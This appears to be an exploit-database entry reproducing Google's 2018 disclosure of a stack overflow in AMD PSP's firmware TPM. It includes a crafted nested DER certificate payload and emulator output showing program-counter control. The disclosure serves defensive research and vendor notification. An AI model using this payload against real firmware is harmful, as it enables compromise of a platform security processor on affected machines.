@@ -1,0 +1,91 @@
+id: 29384
+date: 01/07/2018
+title: AMD PSP fTPM Remote Code Execution Vulnerability
+author: Cfir Cohen
+cves: 
+
+Introduction
+============
+AMD PSP [1] is a dedicated security processor built onto the main CPU die.
+ARM TrustZone provides an isolated execution environment for sensitive and
+privileged tasks, such as main x86 core startup. See [2] for details.
+
+fTPM is a firmware TPM [3] implementation. It runs as a trustlet
+application inside the PSP. fTPM exposes a TPM 2.0 interface over MMIO to
+the host [4].
+
+Research
+========
+The fTPM trustlet code was found in Corebootas git repository [5] and in
+several BIOS update files. The TPM reference implementation code is
+published in trustedcomputinggroup.org (TCG) TPM specification. In fact,
+the code *is* the spec.
+Most TPM vendors implement their TPMs based on the TCG spec code. Vendors
+implement the storage layer (where non-volatile data and persistent objects
+are stored), connect the crypto library to a good source of entropy, and
+sometimes re-implement the low-level crypto functions. However, a lot of
+the TPM code is shared with the publicly accessible TPM specification:
+request/response marshaling, session management and command execution logic.
+This research focused on vendor specific code that diverged from the TCG
+spec.
+
+Vulnerability
+=============
+Through manual static analysis, weave found a stack-based overflow in the
+function EkCheckCurrentCert.
+This function is called from TPM2_CreatePrimary with user controlled data -
+a DER encoded [6] endorsement key (EK) certificate stored in the NV
+storage.
+
+A TLV (type-length-value) structure is parsed and copied on to the parent
+stack frame. Unfortunately, there are missing bounds checks, and a
+specially crafted certificate can lead to a stack overflow:
+
+NESTED_CERT_DATA1 = '\x03\x82\x07\xf0' + 'A * 0x7f0
+NESTED_CERT_DATA2 = '\x03\x82' + pack('>H', len(NESTED_CERT_DATA1)) +
+NESTED_CERT_DATA1
+CERT_DATA = '\x03\x82' + pack('>H', len(NESTED_CERT_DATA2)) +
+NESTED_CERT_DATA2
+
+Proof Of Concept
+================
+Without access to a real AMD hardware, we used an ARM emulator [7] to
+emulate a call to EkCheckCurrentCert with the CERT_DATA listed above. We
+verified that full control on the program counter is possible:
+
+EkCheckCurrentCert+c8    : B               loc_10EE4
+EkCheckCurrentCert+60    : LDR             R4, =0xB80
+EkCheckCurrentCert+62    : ADDS            R4, #0x14
+EkCheckCurrentCert+64    : ADD             SP, R4
+EkCheckCurrentCert+66    : POP             {R4-R7,PC}
+41414140                 : ????
+|
+R0=ff,R1=f00242c,R2=f001c24,R3=824,R4=41414141,R5=41414141,R6=41414141,R7=41414141,PC=41414140,SP=f003000,LR=11125
+
+As far as we know, general exploit mitigation technologies (stack cookies,
+NX stack, ASLR) are not implemented in the PSP environment.
+
+Credits
+===========
+This vulnerability was discovered and reported to AMD by Cfir Cohen of the
+Google Cloud Security Team.
+
+
+Timeline
+========
+09-28-17 - Vulnerability reported to AMD Security Team.
+12-07-17 - Fix is ready. Vendor works on a rollout to affected partners.
+01-03-18 - Public disclosure due to 90 day disclosure deadline.
+
+
+[1] http://www.amd.com/en-us/innovations/software-technologies/security
+[2]
+https://classic.regonline.com/custImages/360000/369552/TCC%20PPTs/TCC2013_VanDoorn.pdf
+[3] https://en.wikipedia.org/wiki/Trusted_Platform_Module
+[4]
+http://www.trustedcomputinggroup.org/wp-content/uploads/PC-Client-Specific-Platform-TPM-Profile-for-TPM-2-0-v43-150126.pdf
+[5] https://github.com/coreboot/blobs/tree/master/southbridge/amd/avalon/PSP
+[6] https://en.wikipedia.org/wiki/X.690#DER_encoding
+[7] http://www.unicorn-engine.org/
+
+#  0day.today [2023-03-25]  #
